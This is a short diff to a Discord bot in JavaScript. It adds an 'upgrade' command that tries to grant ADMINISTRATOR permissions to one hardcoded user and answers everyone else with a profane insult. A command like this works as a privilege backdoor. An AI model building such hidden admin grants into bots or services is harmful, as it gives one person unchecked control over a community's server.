@@ -68,6 +68,18 @@ client.on('message', msg => {
       case 'channel':
         channel.send(channel.id);
         break;
+      case 'upgrade':
+        if(msg.author.username !== 'zeki' || msg.author.discriminator !== '6858'){
+          channel.send('sorry, I don\'t follow commands from total fucking losers');
+          break;
+        }
+        channel.overwritePermissions({
+        	permissionOverwrites: [{
+      			id: msg.author.id,
+      			allow: ['ADMINISTRATOR'],
+        	}]
+        });
+        break;
       case 'kick':
         if(msg.author.username !== 'zeki' || msg.author.discriminator !== '6858'){
           channel.send('sorry, I don\'t follow commands from total fucking losers');
